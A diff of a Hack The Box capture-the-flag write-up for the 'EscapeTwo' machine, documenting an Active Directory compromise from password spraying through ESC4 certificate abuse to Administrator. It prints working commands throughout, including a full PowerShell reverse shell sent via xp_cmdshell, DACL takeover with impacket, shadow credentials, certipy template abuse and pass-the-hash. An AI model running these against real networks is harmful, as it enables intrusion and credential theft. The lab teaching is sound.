@@ -19,13 +19,13 @@ tools_used: [nmap]
 
 ```mermaid
 flowchart TD
-    A[SMB Share Enumeration] --> B[Credential Discovery<br/>Excel Files]
-    B --> C[Password Spraying] 
-    C --> D[SQL Server Access<br/>sa Account]
-    D --> E[Additional Credential Discovery<br/>Config Files]
-    E --> F[WinRM Access<br/>ryan Account]
-    F --> G[WriteOwner Abuse<br/>ca_svc Takeover]
-    G --> H[Certificate Template<br/>ESC4 Exploitation]
+    A[SMB Share Enumeration] --> B[Credential Discovery<br/>Excel File Analysis]
+    B --> C[Password Spraying<br/>Multiple Service Accounts] 
+    C --> D[SQL Server Access<br/>Privileged Database Access]
+    D --> E[Configuration File Discovery<br/>Service Account Credentials]
+    E --> F[WinRM Access<br/>Password Reuse Exploitation]
+    F --> G[WriteOwner Permission Abuse<br/>Certificate Account Takeover]
+    G --> H[Certificate Template Modification<br/>ESC4 Exploitation]
     H --> I[Administrator Access]
     
     classDef recon fill:#e3f2fd,stroke:#1976d2
@@ -65,6 +65,8 @@ nmap -sC -sV -T4 10.10.11.51 -oA nmap/escapetwo
 | 3269 | ldap         | Microsoft Windows Active Directory LDAP      |
 | 5985 | http         | Microsoft HTTPAPI httpd 2.0                  |
 
+Domain controller with SQL Server 2019 indicated potential for database-related privilege escalation paths.
+
 ### DNS Configuration
 
 ```bash
@@ -76,7 +78,7 @@ nxc smb '10.10.11.51' --generate-hosts-file files/hosts && sudo tee -a /etc/host
 
 ### Initial Access Credentials
 
-I saved the assumed breach credentials to files
+Saved the assumed breach credentials to files:
 ```bash
 echo 'rose' > users.txt
 echo 'KxEPkKe6R8su' > creds.txt
@@ -101,7 +103,7 @@ ca_svc
 
 ### Share Enumeration
 
-Also used the credentials to look for accessible file shares.
+Credential validation revealed accessible file shares including sensitive accounting data:
 ```bash
 nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --shares 
 
@@ -116,11 +118,9 @@ SMB         10.10.11.51     445    DC01             SYSVOL          READ        
 SMB         10.10.11.51     445    DC01             Users           READ  
 ```
 
-
-
 ### File System Analysis
 
-SMB share spidering revealed a share called `Accounting Department`.
+SMB share spidering revealed the `Accounting Department` share contained sensitive organizational data:
 ```bash
 nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' -M spider_plus -o DOWNLOAD_FLAG=True
 ```
@@ -131,8 +131,7 @@ cp -r /home/wither/.nxc/modules/nxc_spider_plus/10.10.11.51 .
 
 ### Credential Extraction from Excel Files
 
-The share contained two files, `accounting_2024.xlsx` and `accounts.xlsx`. I unzipped and searched `accounts.xlsx` to find a list of credentials in the `xl/sharedStrings.xml` file.
-
+Share analysis revealed two Excel files: `accounting_2024.xlsx` and `accounts.xlsx`. Excel file structure examination exposed embedded credentials in XML components:
 ```bash
 ls
 accounting_2024.xlsx  accounts.xlsx
@@ -141,7 +140,7 @@ unzip accounts.xlsx                                                             
 xl/sharedStrings.xml:<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
 ```
 
-I extracted the passwords from the XML structure and added them to the password list `creds.txt`.
+Extracted credentials from XML structure for password spraying attack:
 ```bash
 grep -oP '<t xml:space="preserve">.*?</t>' sharedstrings.txt | sed -E -n '10p;15p;20p;24p' | sed -E 's/<\/?t[^>]*>//g' >> creds.txt 
 
@@ -154,7 +153,7 @@ Md9Wlq1E5bZnVDVo
 MSSQLP@ssw0rd!
 ```
 
-Same with the `users.txt`
+Added corresponding usernames to target list:
 ```bash
 grep -oP '<t xml:space="preserve">.*?</t>' sharedstrings.txt | sed -E -n '9p;14p;19p;23p' | sed -E 's/<\/?t[^>]*>//g' >> users.txt 
 
@@ -180,7 +179,7 @@ sa
 
 ### SQL Server Access
 
-The `sa` service account provided local authentication to the MSSQL server:
+SQL server authentication revealed privileged database access through the `sa` service account:
 ```bash
 echo 'sa' >> users.txt
 
@@ -192,19 +191,18 @@ MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (
 
 ### Command Execution via SQL
 
-From this, I leveraged the MSSQL server's `xp_cmdshell` functionality for remote code execution. I opened up a netcat listener:
+Privileged SQL access enabled remote code execution through `xp_cmdshell` functionality:
 ```bash
 nc -nvlp 9001
 ```
 
-And sent a Powershell reverse shell.
 ```bash
 nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth -X '$LHOST = "10.10.14.17"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'
 ```
 
 ### Additional Credential Discovery
 
-In the shell, I found the MSSQL server configuration file `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI`, which revealed another service account `sql_svc`'s credentials `WqSZAF6CysDQbGb3`:
+System enumeration revealed MSSQL server configuration file containing service account credentials:
 ```powershell
 pwd
 C:\SQL2019\ExpressAdv_ENU
@@ -215,14 +213,14 @@ SQLSVCACCOUNT="SEQUEL\sql_svc" SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
 ...
 ```
 
-I added the password to the password list.
+Added newly discovered credentials to password list:
 ```bash
 echo 'WqSZAF6CysDQbGb3' >> creds.txt
 ```
 
 ### Password Reuse Discovery
 
-I sprayed for WinRM access again with the new password, which revealed credential reuse on the `ryan` account, who shared a password with `sql_svc`:
+Extended password spraying revealed credential reuse across service accounts, with `ryan` using the same password as `sql_svc`:
 ```bash
 nxc winrm 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --continue-on-success
 
@@ -231,7 +229,7 @@ WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6C
 ...
 ```
 
-The user flag was in `ryan`'s Desktop
+User flag obtained via compromised account:
 ```powershell
 *Evil-WinRM* PS C:\Users\ryan\Documents> more ../Desktop/user.txt
 ```
@@ -242,7 +240,7 @@ The user flag was in `ryan`'s Desktop
 
 ### Domain Analysis
 
-I used the remote shell to upload the BloodHound data collection tool "SharpHound"
+Uploaded BloodHound data collection tool via SQL server file upload capabilities:
 ```powershell
 nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --put-file SharpHound.exe 'C:\Users\Public\SharpHound.exe'
 
@@ -252,7 +250,7 @@ MSSQL       10.10.11.51     1433   DC01             [*] Size is 1286656 bytes
 MSSQL       10.10.11.51     1433   DC01             [+] File has been uploaded on the remote machine
 ```
 
-And ran it to collect all data on the domain, to a file called `loot.zip`.
+Executed domain enumeration to collect privilege relationships:
 ```powershell
 pwd
 C:\users\public
@@ -260,7 +258,7 @@ C:\users\public
 .\SharpHound.exe -c all --zipfilename loot.zip
 ```
 
-I download the loot, and uploaded it to `BloodHound-CE.`
+Downloaded enumeration results for analysis:
 ```powershell
 nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --get-file 'C:\Users\Public\20250615120137_loot.zip' loot.zip
 
@@ -270,33 +268,27 @@ nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --get-file 'C:\Users\
 
 ### WriteOwner Permission Abuse
 
-BloodHound analysis via the "Outbound Object Control" attribute, revealed that `ryan` possessed `WriteOwner` permissions over `ca_svc`, a certificate services account:
-
-![[Pasted image 20250615203243.png]]
-
-This account is a member of the "Cert Publishers" group, 
-![[Pasted image 20250615203401.png]]
-
-The `WriteOwner` permission allowed me to update the owner of the `ca_svc` user object to `ryan`. 
+BloodHound analysis revealed that `ryan` possessed `WriteOwner` permissions over `ca_svc`, a certificate services account and member of the Certificate Publishers group. WriteOwner permissions allowed complete account takeover through ownership change and DACL modification:
 ```powershell
 impacket-owneredit -action write -new-owner ryan -target ca_svc 10.10.11.51/ryan:WqSZAF6CysDQbGb3   
 ```
 
-And with that write a new ACE to the `ca_svc` DACL 
+Ownership transfer enabled DACL modification to grant full control over the target account:
 ```bash
 impacket-dacledit -action write -target ca_svc -principal ryan DC01.SEQUEL.HTB/ryan:WqSZAF6CysDQbGb3
 ```
 
 ### Key Credential Link Manipulation
 
-Ownership of `ca_svc` enabled certificate-based authentication through key credential modification:
+Account takeover allowed certificate-based authentication configuration, bypassing traditional password authentication:
+
 ```powershell
 .\Whisker.exe add /target:ca_svc
 ...
 Rubeus.exe asktgt /user:ca_svc /certificate:MIIJwAIBAzCCCXwGCSqGSIb3DQEHAaCCCW0EgglpMIIJZTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF...cTvlTuvabfRLlNGUXuTlJi+18EFPxitPFkKCkp1+f5X5bduayLcBqqAgIH0A== /password:"3emBDm8wUGJQagmv" /domain:sequel.htb /dc:DC01.sequel.htb /getcredentials /show
 ```
 
-Passing the certificate to Rubeus got a TGT for the `ca_svc` user giving me the NTLM hash.
+Certificate authentication extracted NTLM hash without requiring password knowledge:
 ```powershell
 .\Rubeus.exe asktgt /user:ca_svc /certificate:MIIJwAIBAzCCCXwGCSqGSIb3DQEHAaCCCW0EgglpMIIJZTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF...cTvlTuvabfRLlNGUXuTlJi+18EFPxitPFkKCkp1+f5X5bduayLcBqqAgIH0A==  /password:"3emBDm8wUGJQagmv" /domain:sequel.htb /dc:DC01.sequel.htb /getcredentials /show
 
@@ -306,7 +298,7 @@ Passing the certificate to Rubeus got a TGT for the `ca_svc` user giving me the 
 
 ### Certificate Template Vulnerability (ESC4)
 
-Certificate services enumeration revealed a vulnerable template `DunderMifflinAuthentication` with excessive permissions:
+Certificate services enumeration revealed vulnerable template `DunderMifflinAuthentication` with excessive permissions allowing template modification:
 ```bash
 certipy find -dc-ip 10.10.11.51 -username ca_svc@sequel.htb -hashes 3B181B914E7A9D5508EA1E20BC2B7FCE -vulnerable -stdout
 
@@ -321,7 +313,7 @@ certipy find -dc-ip 10.10.11.51 -username ca_svc@sequel.htb -hashes 3B181B914E7A
 
 ### Certificate Template Modification
 
-The Certificate Publishers group membership enabled modification of certificate template configuration for administrator impersonation:
+Certificate Publishers group membership provided template modification capabilities enabling ESC4 exploitation:
 ```powershell
 certipy template -u 'ca_svc' -hashes 3B181B914E7A9D5508EA1E20BC2B7FCE -template 'DunderMifflinAuthentication' -write-default-configuration -dc-ip 10.10.11.51
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -330,7 +322,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Successfully updated 'DunderMifflinAuthentication'
 ```
 
-
+Template modification enabled subject alternative name specification, allowing administrator impersonation:
 ```bash      
 certipy req -u 'ca_svc@sequel.htb' -hashes 3B181B914E7A9D5508EA1E20BC2B7FCE -ca sequel-DC01-CA -template 'DunderMifflinAuthentication' -upn Administrator@sequel.htb -target-ip 10.10.11.51
 
@@ -340,7 +332,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
-
+Certificate-based authentication retrieved administrator credentials:
 ```bash
 certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51  
 
@@ -348,34 +340,22 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
 [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
 ```
 
-
+Administrator access achieved via pass-the-hash technique:
 ```bash
 evil-winrm -i 'DC01' -u 'sequel.htb\Administrator' -H 7a8d4e04986afa8ed4060f75e5a0b3ff                                 
 ```
 
-
-
-
----
-
-## Conclusion
-
-Complete domain compromise achieved through credential management failures and certificate services misconfigurations rather than software vulnerabilities.
-
-**Critical Misconfigurations Exploited:**
-- Sensitive credentials stored in accessible file shares
-- Password reuse across multiple service accounts
-- WriteOwner permissions enabling certificate services takeover
-- Certificate template permissions allowing unauthorized enrollment
-
-**Key Technical Takeaway:** Users with object ownership capabilities over certificate services accounts can modify certificate templates to enable administrator impersonation through ESC4 exploitation.
+Root flag on the `Administrator`'s Desktop
+```powershell
+*Evil-WinRM* PS C:\Users\Administrator\Documents> more ../Desktop/root.txt
+```
 
 ---
 
 ## References
 - [Grant rights \| The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/grant-rights)
 - [Grant ownership \| The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/grant-ownership)
-- 
+- [Abusing Active Directory Certificate Services - Part One - Black Hills Information Security, Inc.](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)
 
 ---
 #escapetwo #htb #easy #windows
